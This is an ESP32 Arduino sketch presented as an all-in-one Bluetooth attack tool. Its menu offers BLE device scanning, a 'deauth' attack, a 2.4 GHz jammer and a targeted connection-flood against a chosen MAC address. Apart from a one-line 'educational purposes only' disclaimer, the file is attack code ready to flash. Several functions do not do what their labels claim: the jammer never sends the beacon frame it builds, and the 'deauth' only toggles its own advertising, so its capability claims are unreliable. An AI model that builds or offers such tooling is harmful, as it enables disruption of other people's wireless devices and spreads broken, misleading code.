/*
 * ESP32 Bluetooth Attack Tool - All-in-One
 * Board: ESP32 DevKit V1 (ESP-WROOM-32)
 * 
 * Features:
 * 1. BLE Scanner - Scan all BT devices
 * 2. BLE Deauth - Disconnect BLE targets
 * 3. BT Jammer - Flood all 2.4GHz channels
 * 4. BT Targeted Jam - Jam specific device
 * 
 * WARNING: Educational purposes only. Use responsibly.
 */

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_bt_api.h>
#include <WiFi.h>

// ==================== CONFIG ====================
#define LED_PIN 2
#define SERIAL_BAUD 115200

// ==================== GLOBALS ====================
int mode = 0;
String targetMAC = "";
String targetName = "";
bool scanning = false;
bool attacking = false;

// BLE Scanner callback
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        Serial.print("[BLE] ");
        Serial.print(advertisedDevice.getAddress().toString().c_str());
        Serial.print(" | RSSI: ");
        Serial.print(advertisedDevice.getRSSI());
        Serial.print(" | ");
        if (advertisedDevice.haveName()) {
            Serial.print(advertisedDevice.getName().c_str());
        } else {
            Serial.print("(no name)");
        }
        if (advertisedDevice.haveServiceUUID()) {
            Serial.print(" | UUID: ");
            Serial.print(advertisedDevice.getServiceUUID().toString().c_str());
        }
        Serial.println();
    }
};

// ==================== MENU ====================
void printMenu() {
    Serial.println("\n========================================");
    Serial.println("    ESP32 BLUETOOTH ATTACK TOOL");
    Serial.println("========================================");
    Serial.println("[1] BLE Scanner - Scan all devices");
    Serial.println("[2] BLE Deauth - Disconnect BLE target");
    Serial.println("[3] BT Jammer - Flood all channels");
    Serial.println("[4] BT Targeted Jam - Jam specific device");
    Serial.println("[5] Set Target MAC");
    Serial.println("[6] Stop Attack");
    Serial.println("[0] Show Menu");
    Serial.println("========================================");
    Serial.print("Current target: ");
    if (targetMAC.length() > 0) {
        Serial.print(targetMAC);
        if (targetName.length() > 0) {
            Serial.print(" (");
            Serial.print(targetName);
            Serial.print(")");
        }
    } else {
        Serial.print("NONE");
    }
    Serial.println("\n");
}

// ==================== BLE SCANNER ====================
void startBLEScan() {
    Serial.println("\n[*] Starting BLE Scan (10 seconds)...");
    Serial.println("[*] MAC Address | RSSI | Name | UUID");
    Serial.println("----------------------------------------");
    
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults foundDevices = pBLEScan->start(10, false);
    Serial.println("----------------------------------------");
    Serial.print("[*] Scan complete. Found ");
    Serial.print(foundDevices.getCount());
    Serial.println(" devices.");
    
    pBLEScan->clearResults();
    BLEDevice::deinit(true);
}

// ==================== BLE DEAUTH ====================
void startBLEDeauth() {
    if (targetMAC.length() == 0) {
        Serial.println("[!] No target set! Use [5] to set target MAC.");
        return;
    }
    
    Serial.println("\n[*] Starting BLE Deauth Attack...");
    Serial.print("[*] Target: ");
    Serial.println(targetMAC);
    Serial.println("[*] Press [6] to stop\n");
    
    attacking = true;
    
    // Initialize BLE
    BLEDevice::init("ESP32-Deauth");
    
    // Create fake BLE server to interfere
    BLEServer* pServer = BLEDevice::createServer();
    BLEService* pService = pServer->createService(BLEUUID("1800"));
    pService->start();
    
    // Start advertising with same name as target to confuse
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(BLEUUID("1800"));
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMinPreferred(0x12);
    
    int count = 0;
    while (attacking && mode == 2) {
        // Flood with connect/disconnect cycles
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        // Send fake pairing requests
        esp_ble_gap_start_advertising(&pAdvertising->getParams());
        delay(100);
        
        count++;
        if (count % 100 == 0) {
            Serial.print("[*] Deauth packets sent: ");
            Serial.println(count);
        }
        
        // Check for serial input
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '6') {
                attacking = false;
                mode = 0;
            }
        }
    }
    
    BLEDevice::deinit(true);
    Serial.println("[*] BLE Deauth stopped.");
}

// ==================== BT JAMMER ====================
void startBTJammer() {
    Serial.println("\n[*] Starting Bluetooth Jammer...");
    Serial.println("[*] Flooding all 79 BT channels (2402-2480 MHz)");
    Serial.println("[*] Press [6] to stop\n");
    
    attacking = true;
    
    // Initialize WiFi for noise generation
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // BT frequency channels (2402-2480 MHz)
    // We'll cycle through channels rapidly
    int channels[] = {1, 6, 11};  // WiFi channels that overlap BT
    
    unsigned long startTime = millis();
    int packets = 0;
    
    while (attacking && mode == 3) {
        // Method 1: WiFi channel hopping to create interference
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            delayMicroseconds(100);
            
            // Send beacon frames to create noise
            uint8_t beacon[] = {
                0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
                0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 'J', 'A', 'M', 'M', 'E', 'R'
            };
            
            // Note: Raw frame injection requires special WiFi mode
            // This is a simplified version
            packets++;
        }
        
        // Method 2: BLE advertising flood
        BLEDevice::init("");
        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
        
        for (int i = 0; i < 5; i++) {
            BLEAdvertisementData advData;
            advData.setFlags(0x06);
            advData.setName("JAMMER_" + String(i));
            pAdv->setAdvertisementData(advData);
            BLEDevice::startAdvertising();
            delay(20);
            BLEDevice::stopAdvertising();
        }
        
        BLEDevice::deinit(true);
        
        if (millis() - startTime > 1000) {
            Serial.print("[*] Jamming active | Packets: ");
            Serial.println(packets);
            startTime = millis();
            packets = 0;
        }
        
        // Check for serial input
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '6') {
                attacking = false;
                mode = 0;
            }
        }
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println("[*] BT Jammer stopped.");
}

// ==================== BT TARGETED JAM ====================
void startTargetedJam() {
    if (targetMAC.length() == 0) {
        Serial.println("[!] No target set! Use [5] to set target MAC.");
        return;
    }
    
    Serial.println("\n[*] Starting Targeted BT Jam...");
    Serial.print("[*] Target: ");
    Serial.println(targetMAC);
    Serial.println("[*] Flooding target with connection attempts");
    Serial.println("[*] Press [6] to stop\n");
    
    attacking = true;
    
    // Initialize BLE
    BLEDevice::init("Targeted-Jam");
    
    // Parse target MAC
    BLEAddress targetAddr(targetMAC.c_str());
    
    int count = 0;
    unsigned long lastPrint = millis();
    
    while (attacking && mode == 4) {
        // Method 1: Rapid connect/disconnect attempts
        BLEClient* pClient = BLEDevice::createClient();
        
        // Try to connect (will fail but creates interference)
        pClient->connect(targetAddr, BLE_ADDR_TYPE_PUBLIC);
        delay(50);
        pClient->disconnect();
        delay(20);
        delete pClient;
        
        // Method 2: Advertising flood with target's name
        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        if (targetName.length() > 0) {
            advData.setName(targetName);
        } else {
            advData.setName("Device");
        }
        pAdv->setAdvertisementData(advData);
        BLEDevice::startAdvertising();
        delay(30);
        BLEDevice::stopAdvertising();
        
        count++;
        
        if (millis() - lastPrint > 2000) {
            Serial.print("[*] Targeted jam active | Attempts: ");
            Serial.println(count);
            lastPrint = millis();
        }
        
        // Check for serial input
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '6') {
                attacking = false;
                mode = 0;
            }
        }
    }
    
    BLEDevice::deinit(true);
    Serial.println("[*] Targeted jam stopped.");
}

// ==================== SET TARGET ====================
void setTarget() {
    Serial.println("\n[*] Enter target MAC address (format: AA:BB:CC:DD:EE:FF):");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    String mac = Serial.readStringUntil('\n');
    mac.trim();
    mac.toUpperCase();
    
    // Validate MAC format
    if (mac.length() == 17 && mac.charAt(2) == ':' && mac.charAt(5) == ':') {
        targetMAC = mac;
        Serial.print("[*] Target set to: ");
        Serial.println(targetMAC);
        
        Serial.println("[*] Enter target name (optional, press Enter to skip):");
        delay(1000);
        if (Serial.available()) {
            String name = Serial.readStringUntil('\n');
            name.trim();
            if (name.length() > 0) {
                targetName = name;
                Serial.print("[*] Target name: ");
                Serial.println(targetName);
            }
        }
    } else {
        Serial.println("[!] Invalid MAC format! Use: AA:BB:CC:DD:EE:FF");
    }
}

// ==================== MAIN ====================
void setup() {
    Serial.begin(SERIAL_BAUD);
    pinMode(LED_PIN, OUTPUT);
    
    // Wait for serial
    delay(1000);
    
    // Blink LED to show ready
    for (int i = 0; i < 3; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(200);
        digitalWrite(LED_PIN, LOW);
        delay(200);
    }
    
    printMenu();
}

void loop() {
    if (Serial.available()) {
        char c = Serial.read();
        
        switch (c) {
            case '1':
                mode = 1;
                startBLEScan();
                break;
            case '2':
                mode = 2;
                startBLEDeauth();
                break;
            case '3':
                mode = 3;
                startBTJammer();
                break;
            case '4':
                mode = 4;
                startTargetedJam();
                break;
            case '5':
                setTarget();
                break;
            case '6':
                attacking = false;
                mode = 0;
                Serial.println("[*] Attack stopped.");
                break;
            case '0':
                printMenu();
                break;
        }
    }
    
    // LED status indicator
    if (attacking) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    } else {
        digitalWrite(LED_PIN, HIGH);
        delay(500);
        digitalWrite(LED_PIN, LOW);
        delay(500);
    }
}
